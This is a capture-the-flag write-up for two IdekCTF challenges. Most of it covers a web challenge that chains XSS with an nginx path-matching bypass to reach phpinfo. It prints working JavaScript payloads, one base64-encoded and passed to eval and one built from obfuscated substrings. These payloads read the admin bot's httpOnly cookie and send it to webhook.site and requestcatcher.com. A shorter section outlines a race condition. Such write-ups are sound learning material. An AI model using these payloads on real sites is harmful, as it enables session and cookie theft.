# Writeups for IdekCTF

# Hello (Web)

This was like a normal admin bot cookie exfiltration challenge but with some twists.

Firstly we have these files:
index.php, info.php, admin.js, nginx.conf.

Notable things about each of these:

The info.php basically fetches the phpinfo() which is a function that displays a lot of information especially the cookie of the viewer.
And most importantly it can even display httpOnly cookies which can't normally be accessed by client side javascript.

https://www.webhackingtips.com/weekly-tips/week-8-stealing-httponly-cookies-from-phpinfo

index.php
This page accepts a name attribute in the GET request,creates a local variable with substring of this value(But does not use this variable!)
and then echo's the same after filtering some characters (`$trimmed = array("\r", "\n", "\t", "/", " ")`). 
But this filter is not enough and it is vulnerable to XSS like `/?name=<svg%0conload=alert(123)>`. 

The admin.js shows that the flag is in the bot's cookie.

Finally the nginx conf shows that info.php is resticted to only localhost(and the admin bot is not running on the same system). But this can be bypassed due to 
a php quirk: There is a known trick in php, if we access to /a.php/b.php, the server will ignore the second php file and point us to /a.php. 
In the nginx configuration file they are matching exactly /info.php so if we try /info.php/anything.php, 
it will not match the nginx rule and it will be allowed!

Combining these our payload should be:

```
<script>
fetch("/info.php/index.php")
  .then(response => response.text())
  .then(data => fetch("https://webhook.site/61fec18d-858c-459a-ad80-b3165f77caca/" + btoa(data.substring(data.indexOf("$_COOKIE"), data.indexOf("$_COOKIE") + 100))))
</script>
```
We can't put this directly due to the filter so we base64 encode it. Also we have to url encode the base64 string because of the '+' in it.
The final payload to send to the bot:

`http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=eval(atob("ZmV0Y2goIi9pbmZvLnBocC9pbmRleC5waHAiKQogIC50aGVuKHJlc3BvbnNlID0%2BIHJlc3BvbnNlLnRleHQoKSkKICAudGhlbihkYXRhID0%2BIGZldGNoKCJodHRwczovL3dlYmhvb2suc2l0ZS82MWZlYzE4ZC04NThjLTQ1OWEtYWQ4MC1iMzE2NWY3N2NhY2EvIiArIGJ0b2EoZGF0YS5zdWJzdHJpbmcoZGF0YS5pbmRleE9mKCIkX0NPT0tJRSIpLCBkYXRhLmluZGV4T2YoIiRfQ09PS0lFIikgKyAxMDApKSkpCg%3D%3D"))>`

This works but there is another interesting approach: https://vaktibabat.github.io/posts/idek_2024/
Instead of base64 you get the filtered elements using substring. So `http://` using `window.location.href.substring(0, 7)` as the windows is http://idek-hello.chal.idek.team:1337
and another substring for getting the '/', `window.location.href.substring(5, 6)`.
So this .js code:

```
fetch(window.location.href.substring(0, 7) + "idek-hello.chal.idek.team:1337" + bwindow.location.href.substring(5,6) + "info.php" + window.location.href.substring(5,6) + "index.php").then(function(response) {
	response.text().then(function(txt) {
	txt.split(`\n`).forEach(function(line) {
		if(line.indexOf("FLAG")!=-1) {
		fetch(window.location.href.substring(0, 7) + "nopro.requestcatcher.com" + window.location.href.substring(5,6) + "cookies?resp=" + line)}
	})
	})
})
```
becomes 

```http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"nopro.requestcatcher.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>```
which is sent to the bot.

# Crator

Its basically a race condition where you generate a file containing the flag using one endpoint, leave it on a infinite loop to prevent the file from getting deleted and extract the 
flag using another endpoint before the code  execution of the first one is stopped by the instance(which happens in about 1s).

Very detailed and better writeup:

https://vaktibabat.github.io/posts/idek_2024/